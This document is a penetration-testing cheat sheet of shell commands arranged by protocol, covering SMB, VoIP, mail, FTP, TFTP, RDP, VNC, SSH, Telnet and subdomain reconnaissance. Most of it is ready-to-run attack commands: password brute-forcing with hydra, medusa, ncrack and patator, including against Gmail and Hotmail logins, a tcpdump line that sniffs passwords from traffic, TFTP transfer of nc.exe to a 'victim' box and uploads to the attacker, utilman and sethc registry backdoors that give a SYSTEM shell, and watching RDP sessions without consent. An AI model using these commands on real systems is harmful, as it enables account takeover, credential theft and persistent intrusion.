##-=========================================================-##
enum4linux -a $IP


##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (w/user & pass)
##-=========================================================-##
enum4linux -a -u $User -p $Pass $IP


##-===============================-##
##   [+] enum4linux - bash-loop
##-===============================-##
for targets in $(cat $File.txt); do enum4linux $targets; done


##-====================================-##
##   [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1


##-====================================-##
##   [+] enum4linux - 
##-====================================-##
enum4linux -a -v -M -l -d $1 2>&1 | tee "enum4linux_$1.txt"




nbtscan-unixwiz -f $TARGET



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] Braa is a mass snmp scanner
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
braa public@192.168.1.215:.1.3.6.*




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VoIP/SIP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=========================================================================================-##
##   [+] ACE (Automated Corporate Enumerator) - VoIP Corporate Directory enumeration tool
##-=========================================================================================-##

##-===================================================================-##
##   [+] automatically discover TFTP Server IP via DHCP Option 150
##-===================================================================-##
ace -i eth0 -m 00:1E:F7:28:9C:8e


##-===========================================-##
##   [+] specify IP Address of TFTP Server: 
##-===========================================-##
ace -i eth0 -t 192.168.10.150 -m 00:1E:F7:28:9C:8e


##-===================================-##
##   [+] specify the Voice VLAN ID: 
##-===================================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E

##-======================-##
##   [+] Verbose mode: 
##-======================-##
ace -i eth0 -v 96 -m 00:1E:F7:28:9C:8E -d

##-===============================-##
##   [+] remove vlan interface: 
##-===============================-##
ace -r eth0.96

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the listening mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 0 -m 00:1E:F7:28:9C:8E

##-==================================================================-##
##   [+] auto-discover voice vlan ID in the spoofing mode for CDP: 
##-==================================================================-##
ace -i eth0 -c 1 -m 00:1E:F7:28:9C:8E



sip-methods.nse
sip-enum-users.nse
sip-call-spoof.nse
sip-brute.nse




sipvicious
audit SIP based VoIP systems

svmap, svwar, svcrack, svreport, svcrash.

svmap - sip scanner used to identify any SIP servers

svwar identifies working extension lines on a PBX.




iaxflood - VoIP flooder tool -  IAX payload.



protos-sip - SIP test suite



voiphopper

yersinia
siparmyknife
sctpscan




rtpbreak, 
rtpflood, 
rtpinsertsound, 
rtpmixsound




## --------------------------------------------------------- ##
##    [?] ohrwurm - RTP fuzzer that targets SIP phones
## --------------------------------------------------------- ##



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] CDPSnarf is a network sniffer exclusively written to extract information from CDP packets.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
cdpsnarf -i eth0 -w cdpsnarf.pcap





##  show which user recently logged in
for i in $(cat users);do finger $i $i@192.168.78.148;done


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-========================================-##
##   [+] Sendmail Enumeration (Port 25)
##-========================================-##


##-========================================-##
##   [+] Sendmail - Fingerprint server
##-========================================-##
telnet ip_address 25 (banner grab)



##-===============================-##
##   [+] Mail Server Testing
##-===============================-##


##-==========================-##
##   [+] Enumerate users
##-==========================-##
VRFY username (verifies if username exists - enumeration of accounts)
EXPN username (verifies if username is valid - enumeration of accounts)


##-=========================-##
##   [+] Mail Spoof Test
##-=========================-##
HELO anything MAIL FROM: some_address RCPT TO:some_address DATA . QUIT



##-=================================================-##
##   [+] SpoofCheck.py - DMARC email spoofing
##-=================================================-##
spoofcheck.py $Domain




##-=================================================-##
##   [+] SimplyEmail - OSINT - Email Recon:
##-=================================================-##
simplyemail.py -all -e $Domain






##-=================================================-##
##   [+] SMTP-User-Enum - 
##-=================================================-##
smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET



##-=============================================-##
##   [+] Metasploit - SMTP Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "smtp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=25 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;



##-========================================-##
##   [+] Nmap - Run all SMTP NSE Scans:
##-========================================-##
nmap -p 25 --script=smtp-* $TARGET



##-=======================================================-##
##   [+] Nmap - Enumerate SMTP Users Via VRFY NSE Scan:
##-=======================================================-##
nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 $IP


##-=============================================================-##
##   [+] SMTP-User-Enum - Show which users are on the system:
##-=============================================================-##
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $IP
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP -v


##-==========================================================-##
##   [+] Test for SMTP user enumeration (RCPT TO and VRFY)
##   [+] Test for internal spoofing, and MITM relay.
##-==========================================================-##
ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt


##-================================================-##
##   [+] SMTPRecon - SMTP - Email Reconnaissance
##-================================================-##
smtprecon.py $IP


##-================================================================-##
##   [+] Metasploit - Auxiliary Scanner - SMTP Enumeration Scan:
##-================================================================-##
use auxiliary/scanner/smtp/smtp_enum


##-=============================================================-##
##   [+] SMTP-User-Enum - :
##-=============================================================-##
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.11.1.22 -v


##-==================================================-##
##   [+] Patator - SMTP Vrfy - Brute Force Attack:
##-==================================================-##
patator smtp_vrfy timeout=15 host=10.11.1.22 user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt


##-==================================================-##
##   [+] Nmap - NSE Script - smtp-enum-users.nse
##-==================================================-##
nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 10.11.1.22





##-=======================================-##
##   [+] THC-Hydra - Brute force SMTP:
##-=======================================-##
hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -f 



##-==========================================-##
##   [+] Medusa - SMTP Brute Force Attack:
##-==========================================-##
medusa -M smtp -m AUTH:NTLM -U accounts.txt -p password
medusa -M smtp -m EHLO:world -U accounts.txt -p password


##-===============================================-##
##   [+] Medusa - SMTP VRFY Brute Force Attack:
##-===============================================-##
medusa -M smtp-vrfy -m VERB:VRFY -U accounts.txt -p $Domain


##-=======================================================-##
##   [+] SMTP-User-Enum - SMTP VRFY Brute Force Attack:
##-=======================================================-##
smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t $IP


##-====================================================-##
##   [+] Medusa - SMTP (RCPT TO) Brute Force Attack:
##-====================================================-##
medusa -M smtp-vrfy -m VERB:RCPT TO -U accounts.txt -p $Domain


##-===============================================-##
##   [+] Patator - SMTP VRFY Brute Force Attack:
##-===============================================-##
patator.py smtp_vrfy timeout=15 host=$IP user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt


##-====================================================-##
##   [+] THC-Hydra - SMTP Server Brute Force Attack:
##-====================================================-##
hydra server smtp -l $User@gmail.com -P wordlist -s port -S -v -V


##-=============================================-##
##   [+] THC-Hydra - SMTP Brute Force Attack:
##-=============================================-##
hydra smtp.gmail.com smtp -l $User@gmail.com -P /home/user/Desktop/rockyou.txt -s 465 -S -v -V



##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25
openssl s_client -connect smtp.office365.com:587 -starttls smtp
gnutls-cli-debug --starttls-proto smtp --port 25 localhost



##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null |
openssl x509 -fingerprint -noout -in /dev/stdin | cut -d'=' -f2


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
sudo -u postfix openssl s_client -showcerts -starttls smtp -connect smtp.gmail.com:587 < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -CApath /etc/ssl/certs -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null






##-===================================-##
##  [+] Capture SMTP / POP3 Email
##-===================================-##
## ----------------------------------- ##
##  [?] Parse the email recipients
## ----------------------------------- ##
tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'







xsstracer $TARGET 80
















tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] POP3 - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


nmap -p 110 --script=pop3-* $TARGET



##-=======================================-##
##   [+] THC-Hydra - Brute Force - POP3
##-=======================================-##
hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -f 




medusa -M pop3 -m MODE:AS400 -U accounts.txt -p password
medusa -M pop3 -m DOMAIN:foo.com -U accounts.txt -p password
hydra -l muts -P pass.txt my.pop3.mail pop3 >> brute_pop3.out
hydra -S -l myemailaddress@hotmail.co.uk -P password.lst pop3.live.com -s 995 pop3 >> brute_pop3.out




##-=========================================-##
##   [+] secure POP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:995
openssl s_client -crlf -connect server.server.net:110 -starttls pop3



##-=============================================-##
##   [+] Metasploit - POP3 Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "pop" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=110 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] IMAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


imap-capabilities.nse
imap-ntlm-info.nse
imap-brute.nse


##-=========================================-##
##   [+] secure IMAP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:993
openssl s_client -ssl3 -connect imap.gmail.com:993
gnutls-cli imap.gmail.com -p 993




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] FTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##





##-===========================================================-##
##   [+] NMap - FTP - NSE Modules - Vuln Scans + Backdoors:
##-===========================================================-##
nmap -n -Pn -sV $IP -p $PORT --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN /$Dir/ftp_$IP-$PORT.nmap



##-========================================================================-##
##   [+] NMap - FTP - NSE Modules - All Scans - Except Brute,DOS,Fuzzer:
##-========================================================================-##
nmap -p 21 --script="+\*ftp\* and not brute and not dos and not fuzzer" -vv -oN ftp; $IP


##-===========================================-##
##   [+] NMap - FTP - All NSE Module Scans:
##-===========================================-##
nmap -p 21 --script=ftp-* $TARGET


##-==============================================================-##
##   [+] NMap - FTP - NSE Modules - All Scans + Vulners Scans:
##-==============================================================-##
nmap -A -sV -Pn -sC -p 21 -v --script-timeout 90 --script=ftp-*,/usr/share/nmap/scripts/vulners $Domain | tee ~/Downloads/NMap-$Domain-FTP-Port21.txt



##-==========================================-##
##   [+] Metasploit - FTP Version Scanner:
##-==========================================-##
msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET";
use auxiliary/scanner/ftp/ftp_version; run



##-============================================-##
##   [+] Metasploit - Anonymous FTP Scanner:
##-============================================-##
msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; 
use auxiliary/scanner/ftp/anonymous; run; exit;" | tee ~/Downloads/msf-$TARGET-FTP-Port21-Anonymous.raw





##-=======================================-##
##   [+] THC-Hydra - Brute Force - FTP
##-=======================================-##


hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -o $OUTPUT/ftphydra_$IP-$PORT -u $IP -s $PORT ftp"


hydra -L $User.txt -P $Passlist.txt ftp://$IP
hydra -l $User -P $Passlist.txt ftp://$IP

hydra -l superuser -P pwd.txt -v -f -e ns -t 5 -w 20 $IP ftp >> brute_ftp.out
hydra -t 5 -V -f -l root -P $PassFile.txt ftp://$IP >> brute_ftp.out
hydra -v -f -l ftp -P $PassFile.lst -t 10 ftp://$IP >> brute_ftp.out
hydra -l root -P 500-worst-passwords.txt $IP ftp



medusa -u test -P 500-worst-passwords.txt -h $IP -M ftp
medusa -M ftp -h host -u $User -p $Pass




patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500

patator ftp_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500


patator ssh_login host=$line user=FILE0 0=$USERNAME password=FILE1 1=$PASSWORD --max-retries 0 --timeout 10 -x ignore:time=0-3



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ftp" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RHOST=$TARGET RHOSTS=$TARGET RPORT=21 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TFTP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-============================================-##
##   [+] NMap - TFTP - All NSE Module Scans:
##-============================================-##
nmap -A -sU -sV -Pn -v --script-timeout 90 --script=tftp*,/usr/share/nmap/scripts/vulners -p 69 $TARGET


 atftpd --daemon --port 69 /tftp
 cp /usr/share/windows-binaries/nc.exe /tftp

On Victim Windows Box
tftp -i 192.168.0.100 get nc.exe
Upload to Attacker :
tftp -v 192.168.0.100 -m put myfile
Download in Windows
tftp get 2.3.5.1­:/­lan­scan  // (get the file lanscan from TFTP server 2.3.5.1)




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] RDP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================-##
##  [+] NMap - RDP - NSE Scans:
##-================================-##
nmap --script rdp-ntlm-info.nse $IP
nmap --script rdp-enum-encryption.nse $IP
nmap --script rdp-vuln-ms12-020.nse $IP
nmap --script rlogin-brute.nse $IP


##-=======================================-##
##   [+] THC-Hydra - Brute Force - RDP
##-=======================================-##
hydra -l admin -P /root/Desktop/$PassFile -S X.X.X.X rdp
hydra -l admin -P /root/Desktop/$PassFile -S $IP rdp




medusa -u administrator -P /usr/share/john/password.lst -h 10.10.10.71 -M rdp
ncrack -p rdp -u administrator --pass '$Pass' -iL in2
hydra -v -f -l administrator -P common.txt rdp://192.168.67.132 // not good
ncrack -vv --user $User -P $PassFile.txt rdp://10.10.10.10



##-========================================-##
##  [+] RDesktop - RDP Remote Connection:
##-========================================-##
rdesktop -u $User -p $Pass $TARGET


##-=========================================================-##
##  [+] XFreeRDP - Remote Desktop Protocol - Connection:
##-=========================================================-##
xfreerdp /u:alice /v:10.11.1.50




##-====================================-##
##  [+] RDP Backdoor
##-====================================-##

utilman.exe

## -------------------------------------------------- ##
##  [?] At the login screen, press Windows Key+U
##  [?] you get a cmd.exe window as SYSTEM.
## -------------------------------------------------- ##


powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

sethc.exe
 
## ---------------------------------------------------------------------- ##
##  [?] Hit F5 a bunch of times when you are at the RDP login screen.
## ---------------------------------------------------------------------- ##


powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f


##-=========================================-##
##  [+] Remote Desktop Services Shadowing
##-=========================================-##
## ---------------------------------------------------------------------------------- ##
##  [?] FreeRDP and rdesktop dont support Remote Desktop Services Shadowing feature.
## ---------------------------------------------------------------------------------- ##
##  [?] Requirements: RDP must be running
## ------------------------------------------ ##

powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
# 4 – View Session without user’s permission.


##-==================================================-##
##  [+] Allow remote connections to this computer
##-==================================================-##
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


##-=======================================-##
##  [+] Disable UAC remote restriction
##-=======================================-##
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f






## ------------------------------------------------------------------------------------------------------------------------ ##
##  [?] /v                ||  lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;
##  [?] /shadow           ||  is used to specify the {SESSION_ID} value that is a shadowee’s session ID;
##  [?] /noconsentprompt  ||  allows to bypass a shadowee’s permission and shadow their session without their consent;
##  [?] /prompt           || is used to specify a user’s credentials to connect to a remote host.
## ------------------------------------------------------------------------------------------------------------------------ ##
mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] VNC - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================-##
##  [+] NMap - VNC - NSE Scans:
##-================================-##
nmap --script vnc-info.nse $IP
nmap --script vnc-title.nse $IP

##-====================================-##
##  [+] NMap - VNC Brute - NSE Scan:
##-====================================-##
nmap --script vnc-brute.nse $IP
nmap --script=vnc-brute -p5800,5900 $IP




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Wake-On-LAN - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-==============================================-##
##  [+] NMap - Wake-on-LAN Broadcast NSE Scan
##-==============================================-##
nmap --script broadcast-wake-on-lan.nse $IP






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SSH - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



medusa -h $IP -P /$Dir/$PassFile -u $User -M ssh
medusa -h 10.10.XX -P /root/pasword.txt -u root -M ssh


ncrack -p ssh -u $User --pass '$Pass' -iL in
ncrack -p ssh -u root --pass 'root' -iL in

--proxy

ncrack -v --user root localhost:22
  ncrack -v -T5 https://192.168.0.1
  ncrack -v -iX ~/nmap.xml -g CL=5,to=1h



ncrack $Domain:21 ftp://10.0.0.10

ssh://192.168.1.*:22

192.168.0.0/8 10.0.0,1,3-7.- -p22


-v

--append-output
--resume <file>: Continue previously saved session
             --save <file>: Save restoration file with specific filename



##-=======================================-##
##   [+] THC-Hydra - Brute Force - SSH
##-=======================================-##
hydra -t 5 -V -f -l root -P common.txt localhost ssh >> brute_ssh.out
hydra -v -l root -P 500-worst-passwords.txt 10.10.10.10 ssh >> brute_ssh.out
hydra -v -l root -P fpass.lst -t 5 ssh://ip -o brute_ssh.out

hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -f 


for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ssh" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=22 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS KEY_PATH=$KEY_PATH VERBOSE=false E; done;


nmap -p 22 --script=ssh-* $TARGET
nmap -A -sV -Pn -sC -p 22 -v --script-timeout 90 --script=ssh-*,/usr/share/nmap/scripts/vulners $TARGET



##-==================================================-##
##   [+] Metasploit - SSH User Enumeration Scanner:
##-==================================================-##
msfconsole -q -x '$(setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run)'





ssh-audit $TARGET:22



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Telnet - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nmap -p 22 --script=telnet-* $TARGET


hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -f 



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "telnet" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RPORT=23 RHOST=$TARGET RHOSTS=$TARGET USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;















iptraf -i "wlan0"




wpscan --url www.vyxunbnbs.com/mobile --enumerate u --url $ip/blog --proxy $ip:3129




routersploit


Metasploit Scanning

auxiliary/scanner/*

portscan/tcp
http/http_version
http/tomcat_enum
http/trace_axd







https://github.com/ChrisTruncer/Just-Metadata



daemonlogger darkstat 
dns_browse dnsbulktest dnsenum dnsgram dnshistory dnsmap dnsping dnsrecon dbus-send dnsscan dnsscope dnssec-trust-anchors.d dnsspoof dnstap-read  
dnstap-read dnstcpbench dnstop dnstracer dnstraceroute dns_tree dnstwist dnswalk dnswasher dnsdomainname dnseval nss-tlsd pdns_notify resolvectl sdig systemd.dnssd unbound-host validns 

dhcpdump dhcpig dhcp-options danetool dhcpd.conf dane_verification_status_print dirb dmitry 
dialog

People Search
Switchboard - http://www.switchboard.com/person

Zaba - http://www.zabasearch.com/






curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=%40$Domain


curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=$CompanyURL


curl -Iks --location -X GET -A "x-agent" --proxy http://10.64.0.1:1080 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy http://10.8.0.1:1080 $Domain


## Parse A blockList To Get Just The Domain:
curl -s http://some.list | sed 's/^||//' | cut -d'^' -f-1



##-===================================-##
##   [+] Spyse - Subdomain Lookup:
##-===================================-##
spyse -target $Domain --subdomains


##-===============================================-##
##   [+] Spyse - Get Autonomous System Details:
##-===============================================-##
echo "AS15169" | spysecli as


##-========================================-##
##   [+] Spyse - Get IPv4 Host Details:
##-========================================-##
echo "$DNSIP" | spysecli ip


##-===================================-##
##   [+] Spyse - Reverse IP Lookup:
##-===================================-##
echo "$DNSIP" | spysecli reverse-ip


##-===================================-##
##   [+] Spyse - Reverse NS Lookup:
##-===================================-##
echo "ns1.$Domain.com" | spysecli reverse-ns


##-==================================-##
##   [+] Spyse - Subdomain Lookup:
 ##-===================================-##
echo "$Domain" | spysecli subdomains


##-==============================================-##
##   [+] Spyse - Get Historical DNS A Records:
##-==============================================-##
echo "$Domain" | spysecli history-dns-a


##-==============================================-##
##   [+] Spyse - Get Historical DNS NS Records:
##-==============================================-##
echo "$Domain" | spysecli history-dns-ns






curl -s https://crt.sh/?q=%25.$Target
curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u


censys.io/domain?q=
censys.io/certificates?q=




curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u

curl https://www.virustotal.com/en/domain/$target/information/ -H 'Host: www.virustotal.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -m 30 | grep information | grep "$target" | awk '{print $3}' | sed 's/\// /g' | awk '{print $4}' >> /tmp/onlineFoundSubdomains





https://api.hackertarget.com/pagelinks/?q=
https://api.hackertarget.com/hostsearch/?q=


curl https://api.hackertarget.com/whois/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nping/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/findshareddns/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/geoip/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/zonetransfer/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/httpheaders/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/hostsearch/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/dnslookup/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/reversedns/?q=$ip --connect-timeout 15
curl https://api.hackertarget.com/mtr/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/subnetcalc/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15


curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u

curl http://api.hackertarget.com/hostsearch/?q=$target -m 30 | sed 's/,/ /' | awk '{print $1}' | grep "$target" >> /tmp/onlineFoundSubdomains





## --------------------------------------------------------------------- ##
##   [+] Double checking for subdomains with amass and certspotter...
## --------------------------------------------------------------------- ##
amass enum -d $URL | tee -a $URL/recon/$File.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$URL | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
certspotter | tee -a $URL/recon/$File.txt



[+]certspotter

curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq


curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1

##-===============================================-##
##   [+] Cert.sh - Checking invalid certificate
##-===============================================-##
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx


#!/bin/bash
echo "[+] Start gather subdomain "
for i in `cat list.txt`
do
curl -s https://crt.sh/\?q\=$i\&output\=json | jq -r '.[].name_value'|sed 's/\*\.//g'|sort -u |tee -a domains.txt
done

cat domains.txt |httprobe|tee live-domain.txt





